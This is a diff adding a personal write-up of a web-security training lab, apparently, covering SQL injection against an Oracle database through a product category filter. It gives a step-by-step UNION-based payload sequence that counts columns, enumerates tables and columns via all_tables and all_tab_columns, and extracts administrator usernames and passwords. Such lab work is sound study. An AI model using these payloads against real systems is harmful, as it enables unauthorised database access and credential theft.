@@ -1,0 +1,45 @@
+LAB 10:  SQL injection attack, listing the database contents on Oracle
+
+VULNERABLE CATEGORY= In product category filter
+
+End Goal: Get the username and password and login as the administrator
+
+ANALYSIS: 
+1. My will first give the single-quote(') ==> this gives me an Internal server error
+2. Then I will comment out the rest of the query (--) ==> this gives me 200 response
+      *** so one thing cofirm there there is a presence of a sql injection
+3. NOW I WILL CHECK FOR HOW MUCH COLUMN DOES IT HAVE?
+      (3A). ' ORDER BY 1-- ==> It gives me an 200 response so there might me more then 1 column
+      (3B). ' ORDER BY 2-- ==> it gives me an 200 response so there might be more  then 2 column as well
+      (3C). ' ORDER BY 3-- ==> It gives me an Internal server error so there is total (3-1)=2 column present.
+
+ 4. NOW KNOW THE WHAT DATA DOES THE COLUMN HOLDS?
+      *** Since I have two columns then:::
+   (4A). ' UNION SELECT NULL,NULL-- ==> This does gives me an error because in oracle I also need FROM while SELECT
+   (4B). ' UNION SELECT NULL,NULL FROM DUAL-- ==> this does gives me an 200 response
+          SO, what is DUAL in oracle??
+          Ans:  The Role of DUAL
+
+               (4BA).  In Oracle, DUAL is a special table with one row and one column (DUMMY) containing the value 'X'.
+                (4BC). It is commonly used for queries that return a single value or when no actual table is involved.
+
+     (4C). ' UNION SELECT 'a','b' FROM DUAL--  ==> a and b shows in the page this proves that two columns have the strings datatypes means (VARCHAR)    
+
+ 5. Try to get the what is the table name and the 2 columns name is: 
+     ***  SELECT * FROM all_tables (let's use this to see what it contains)
+     *** ' UNION SELECT *,NULL FROM all_tables--
+     *** I got::: TABLE_NAME (as table name)
+     *** ' UNION SELECT TABLE_NAME,NULL FROM all_tables-- ==> this gives me list of table name present in the database
+     *** USERS_YYJPSG ==> this is my tablenamethis seems intersting lets look into this
+   Now, I got the tablename now I should get the columns name thatc contain the username and the password 
+   (5A).  SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE' 
+   *** so I will be doing as:
+          *** ' UNION SELECT COLUMN_NAME,NULL FROM all_tab_columns WHERE table_name='USERS_YYJPSG'--            
+     (5B). Ok, so I got here three columns they are: PASSWORD_MLGBHT,USERNAME_IUXAXF,EMAIL 
+
+ 6. Now, I have tablename and columns name both Now I can extract the data i.e username and password from that table.
+  (6A). SELECT * FROM all_tables
+  the query I will give here is: ' UNION SELECT USERNAME_IUXAXF,PASSWORD_MLGBHT FROM USERS_YYJPSG-- ==> And then I can see the username and the password there.
+
+  DONE SOLVED THE LAB.   
+     
